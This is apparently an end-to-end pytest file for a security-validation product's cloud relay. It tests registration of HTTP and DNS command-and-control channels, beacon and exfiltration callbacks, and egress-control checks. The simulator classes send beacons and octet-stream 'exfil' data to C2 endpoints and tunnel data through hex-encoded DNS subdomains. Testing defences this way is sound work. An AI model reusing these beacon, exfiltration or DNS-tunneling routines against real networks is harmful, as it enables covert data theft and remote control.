# Mirqab Cloud Relay - C2 Callback E2E Tests
"""
End-to-end tests for C2 callback validation via Cloud Relay.

Tests:
1. HTTP C2 callback reception
2. DNS C2 tunneling detection
3. Egress control validation
4. Callback data reporting to Master
"""

import asyncio
import pytest
import httpx
import socket
import struct
import dns.resolver
import dns.message
import dns.query
from datetime import datetime
from typing import Optional
from dataclasses import dataclass

# Test configuration
CLOUD_RELAY_URL = "https://api.relay.mirqab.io"
MASTER_URL = "https://api.offensight.local:8000"
TEST_TENANT_ID = "e2e-test-tenant"
TEST_API_KEY = "cr_test_e2e_integration_key"

# C2 endpoints
HTTP_C2_ENDPOINT = "https://c2-http.{tenant_id}.relay.mirqab.io"
DNS_C2_DOMAIN = "{tenant_id}.c2.mirqab.io"


@dataclass
class C2Channel:
    """Represents a C2 channel."""
    channel_id: str
    channel_type: str
    endpoint: str
    active: bool = False


class CloudRelayClient:
    """Test client for Cloud Relay C2 API."""

    def __init__(self, base_url: str, tenant_id: str, api_key: str):
        self.base_url = base_url
        self.tenant_id = tenant_id
        self.api_key = api_key
        self.client: Optional[httpx.AsyncClient] = None

    async def __aenter__(self):
        self.client = httpx.AsyncClient(
            base_url=self.base_url,
            headers={
                "X-Tenant-ID": self.tenant_id,
                "X-API-Key": self.api_key,
                "Content-Type": "application/json",
            },
            timeout=30.0,
        )
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.client:
            await self.client.aclose()

    async def register_c2_channel(
        self,
        channel_type: str,
        metadata: Optional[dict] = None,
    ) -> C2Channel:
        """Register a C2 channel for callback reception."""
        response = await self.client.post(
            "/api/v1/c2/channels",
            json={
                "channel_type": channel_type,
                "metadata": metadata or {},
            },
        )
        response.raise_for_status()
        data = response.json()
        return C2Channel(
            channel_id=data["channel_id"],
            channel_type=channel_type,
            endpoint=data["endpoint"],
            active=True,
        )

    async def get_channel_callbacks(self, channel_id: str) -> list[dict]:
        """Get callbacks received by a channel."""
        response = await self.client.get(f"/api/v1/c2/channels/{channel_id}/callbacks")
        response.raise_for_status()
        return response.json().get("callbacks", [])

    async def deregister_channel(self, channel_id: str) -> None:
        """Deregister a C2 channel."""
        response = await self.client.delete(f"/api/v1/c2/channels/{channel_id}")
        response.raise_for_status()

    async def get_egress_test_status(self, test_id: str) -> dict:
        """Get egress control test status."""
        response = await self.client.get(f"/api/v1/egress-test/{test_id}")
        response.raise_for_status()
        return response.json()

    async def submit_egress_test(
        self,
        agent_id: str,
        test_types: list[str],
    ) -> dict:
        """Submit egress control test."""
        response = await self.client.post(
            "/api/v1/egress-test",
            json={
                "agent_id": agent_id,
                "test_types": test_types,
            },
        )
        response.raise_for_status()
        return response.json()


class HTTPCallbackSimulator:
    """Simulates HTTP C2 callbacks to Cloud Relay."""

    def __init__(self, endpoint: str):
        self.endpoint = endpoint
        self.client: Optional[httpx.AsyncClient] = None

    async def __aenter__(self):
        self.client = httpx.AsyncClient(timeout=10.0)
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.client:
            await self.client.aclose()

    async def send_beacon(
        self,
        agent_id: str,
        execution_id: str,
        data: dict,
    ) -> bool:
        """Send a beacon callback to the C2 server."""
        try:
            response = await self.client.post(
                f"{self.endpoint}/beacon",
                json={
                    "agent_id": agent_id,
                    "execution_id": execution_id,
                    "timestamp": datetime.utcnow().isoformat(),
                    "data": data,
                },
                headers={"Content-Type": "application/json"},
            )
            return response.status_code == 200
        except Exception as e:
            print(f"Beacon failed: {e}")
            return False

    async def send_exfil_data(
        self,
        agent_id: str,
        execution_id: str,
        data: bytes,
    ) -> bool:
        """Send exfiltration data to the C2 server."""
        try:
            response = await self.client.post(
                f"{self.endpoint}/exfil",
                content=data,
                headers={
                    "X-Agent-ID": agent_id,
                    "X-Execution-ID": execution_id,
                    "Content-Type": "application/octet-stream",
                },
            )
            return response.status_code == 200
        except Exception as e:
            print(f"Exfil failed: {e}")
            return False


class DNSCallbackSimulator:
    """Simulates DNS C2 callbacks."""

    def __init__(self, domain: str, dns_server: str = "8.8.8.8"):
        self.domain = domain
        self.dns_server = dns_server

    def encode_data_in_subdomain(self, data: str) -> str:
        """Encode data as subdomain labels."""
        # Simple hex encoding for testing
        hex_data = data.encode().hex()
        # Split into 63-character labels (DNS label limit)
        labels = [hex_data[i:i + 60] for i in range(0, len(hex_data), 60)]
        return ".".join(labels) + "." + self.domain

    async def send_dns_beacon(
        self,
        agent_id: str,
        execution_id: str,
    ) -> bool:
        """Send a DNS beacon callback."""
        try:
            # Encode agent info in subdomain
            beacon_data = f"{agent_id}:{execution_id}"
            query_domain = self.encode_data_in_subdomain(beacon_data)

            # Resolve the domain (this sends the beacon to our DNS server)
            resolver = dns.resolver.Resolver()
            resolver.nameservers = [self.dns_server]

            try:
                # The query itself is the beacon - response doesn't matter
                await asyncio.get_event_loop().run_in_executor(
                    None,
                    lambda: resolver.resolve(query_domain, "A"),
                )
            except dns.resolver.NXDOMAIN:
                # Expected - our DNS server may return NXDOMAIN
                pass

            return True
        except Exception as e:
            print(f"DNS beacon failed: {e}")
            return False


@pytest.fixture
async def cloud_relay_client():
    """Create Cloud Relay client fixture."""
    async with CloudRelayClient(CLOUD_RELAY_URL, TEST_TENANT_ID, TEST_API_KEY) as client:
        yield client


@pytest.fixture
async def http_simulator():
    """Create HTTP callback simulator fixture."""
    endpoint = HTTP_C2_ENDPOINT.format(tenant_id=TEST_TENANT_ID)
    async with HTTPCallbackSimulator(endpoint) as simulator:
        yield simulator


@pytest.fixture
def dns_simulator():
    """Create DNS callback simulator fixture."""
    domain = DNS_C2_DOMAIN.format(tenant_id=TEST_TENANT_ID)
    return DNSCallbackSimulator(domain)


@pytest.mark.asyncio
async def test_http_c2_channel_registration(cloud_relay_client: CloudRelayClient):
    """Test HTTP C2 channel registration."""
    # Register channel
    channel = await cloud_relay_client.register_c2_channel(
        channel_type="http",
        metadata={"test": True},
    )

    assert channel.channel_id, "Should return channel_id"
    assert channel.endpoint, "Should return endpoint"
    assert channel.active

    print(f"Registered HTTP C2 channel: {channel.channel_id}")
    print(f"Endpoint: {channel.endpoint}")

    # Cleanup
    await cloud_relay_client.deregister_channel(channel.channel_id)


@pytest.mark.asyncio
async def test_http_c2_callback_reception(
    cloud_relay_client: CloudRelayClient,
    http_simulator: HTTPCallbackSimulator,
):
    """Test HTTP C2 callback is received and logged."""
    # Register channel
    channel = await cloud_relay_client.register_c2_channel(channel_type="http")

    try:
        # Send beacon callback
        test_agent_id = "test-agent-001"
        test_execution_id = "exec-12345"
        test_data = {"command": "whoami", "result": "nt authority\\system"}

        success = await http_simulator.send_beacon(
            agent_id=test_agent_id,
            execution_id=test_execution_id,
            data=test_data,
        )

        assert success, "Beacon should be sent successfully"

        # Wait for callback to be logged
        await asyncio.sleep(2)

        # Verify callback was received
        callbacks = await cloud_relay_client.get_channel_callbacks(channel.channel_id)

        assert len(callbacks) > 0, "Should have received at least one callback"

        # Find our callback
        our_callback = next(
            (c for c in callbacks if c.get("agent_id") == test_agent_id),
            None,
        )
        assert our_callback, "Our callback should be logged"
        assert our_callback.get("execution_id") == test_execution_id

        print(f"Callback received: {our_callback}")

    finally:
        await cloud_relay_client.deregister_channel(channel.channel_id)


@pytest.mark.asyncio
async def test_http_c2_exfil_detection(
    cloud_relay_client: CloudRelayClient,
    http_simulator: HTTPCallbackSimulator,
):
    """Test HTTP C2 data exfiltration is detected."""
    # Register channel
    channel = await cloud_relay_client.register_c2_channel(channel_type="http")

    try:
        # Send exfiltration data
        test_agent_id = "test-agent-002"
        test_execution_id = "exec-67890"
        test_data = b"sensitive_data_extracted_from_target"

        success = await http_simulator.send_exfil_data(
            agent_id=test_agent_id,
            execution_id=test_execution_id,
            data=test_data,
        )

        assert success, "Exfil should be sent successfully"

        # Wait for callback to be logged
        await asyncio.sleep(2)

        # Verify exfil was detected
        callbacks = await cloud_relay_client.get_channel_callbacks(channel.channel_id)

        exfil_callbacks = [c for c in callbacks if c.get("type") == "exfil"]
        assert len(exfil_callbacks) > 0, "Exfiltration should be detected"

        print(f"Exfiltration detected: {len(test_data)} bytes")

    finally:
        await cloud_relay_client.deregister_channel(channel.channel_id)


@pytest.mark.asyncio
async def test_dns_c2_channel_registration(cloud_relay_client: CloudRelayClient):
    """Test DNS C2 channel registration."""
    # Register channel
    channel = await cloud_relay_client.register_c2_channel(
        channel_type="dns",
        metadata={"subdomain_prefix": "data"},
    )

    assert channel.channel_id, "Should return channel_id"
    assert channel.endpoint, "Should return DNS domain"

    print(f"Registered DNS C2 channel: {channel.channel_id}")
    print(f"Domain: {channel.endpoint}")

    # Cleanup
    await cloud_relay_client.deregister_channel(channel.channel_id)


@pytest.mark.asyncio
async def test_egress_control_validation(cloud_relay_client: CloudRelayClient):
    """Test egress control validation via Cloud Relay."""
    # Submit egress test
    test_result = await cloud_relay_client.submit_egress_test(
        agent_id="test-agent-egress",
        test_types=["http", "https", "dns"],
    )

    test_id = test_result.get("test_id")
    assert test_id, "Should return test_id"

    # Wait for results
    for _ in range(30):  # 30 second timeout
        status = await cloud_relay_client.get_egress_test_status(test_id)
        if status.get("status") in ("completed", "failed"):
            break
        await asyncio.sleep(1)

    # Verify results
    assert status["status"] == "completed"

    # Check egress results
    results = status.get("results", {})
    print("\n=== Egress Control Test Results ===")
    for test_type, result in results.items():
        allowed = result.get("allowed", False)
        blocked = result.get("blocked", False)
        print(f"{test_type}: {'BLOCKED' if blocked else 'ALLOWED'}")

    # At least one protocol should have been tested
    assert len(results) > 0, "Should have test results"


@pytest.mark.asyncio
async def test_callback_sync_to_master(cloud_relay_client: CloudRelayClient):
    """Test that C2 callbacks are synced to Master."""
    # Register channel with sync enabled
    channel = await cloud_relay_client.register_c2_channel(
        channel_type="http",
        metadata={"sync_to_master": True},
    )

    try:
        # Note: This test requires Master API integration
        # For now, just verify the channel was created
        assert channel.active

        print(f"Channel {channel.channel_id} ready for Master sync")

    finally:
        await cloud_relay_client.deregister_channel(channel.channel_id)


if __name__ == "__main__":
    # Run with: python -m pytest tests/e2e/test_c2_callback.py -v
    pytest.main([__file__, "-v", "--asyncio-mode=auto"])
